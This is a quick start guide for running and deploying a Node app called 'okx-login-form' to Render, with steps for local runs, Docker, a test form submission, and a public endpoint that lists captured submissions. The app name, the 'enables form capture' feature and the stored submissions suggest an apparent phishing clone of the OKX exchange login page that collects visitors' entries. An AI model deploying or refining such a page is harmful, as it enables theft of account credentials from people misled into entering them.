# Quick Start Guide

## Run Locally (No Docker)

```bash
# 1. Install dependencies
npm install

# 2. Start server
npm start

# 3. Open browser
# http://localhost:3000

# 4. View form submissions
# http://localhost:3000/api/submissions
```

---

## Deploy to Render (Production)

### Option 1: GitHub + Render (Recommended)

```bash
# 1. Push code to GitHub
git add .
git commit -m "Deploy to Render"
git push origin main

# 2. Go to Render Dashboard
# https://dashboard.render.com

# 3. Click "New +" → "Web Service"

# 4. Connect GitHub & select repository

# 5. Configure:
# Name: okx-login-form
# Environment: Node
# Build Command: npm install
# Start Command: node server.js
# Port: 3000

# 6. Click "Create Web Service"

# Your app will be live at:
# https://okx-login-form.onrender.com
```

### Option 2: Docker + Render

```bash
# 1. Build Docker image
docker build -t okx-login-form .

# 2. Test locally
docker run -p 3000:3000 okx-login-form

# 3. On Render Dashboard:
# - Select "Docker" environment
# - Point to your image
# - Deploy
```

---

## Test the Form Submission

### Using cURL
```bash
curl -X POST http://localhost:3000/api/submit-form \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","email":"test@example.com"}'
```

### View All Submissions
```bash
curl http://localhost:3000/api/submissions
```

### Health Check
```bash
curl http://localhost:3000/api/health
```

---

## What's Included

✅ **Form UI Fix** - Removes loading skeleton, enables form capture  
✅ **Data Capture** - Automatically captures form submissions  
✅ **Storage** - Saves submissions to `form-submissions.json`  
✅ **API** - RESTful endpoints to access data  
✅ **Docker** - Production-ready containerization  
✅ **Deployment** - Ready for Render.com  

---

## Accessing Your Live App

Once deployed to Render:

- **Form:** `https://your-app.onrender.com`
- **Submit Form:** API at same domain  
- **View Data:** `https://your-app.onrender.com/api/submissions`

---

## Monitoring

Render provides:
- Live logs
- Restart options
- Memory/CPU monitoring
- Auto-renewal of SSL certificates

---

## Next Steps

1. Test locally with `npm install && npm start`
2. Test Docker with `docker build -t okx-login-form . && docker run -p 3000:3000 okx-login-form`
3. Push to GitHub
4. Deploy via Render dashboard
5. Visit your live URL

**Your deployment is ready to go!** 🚀
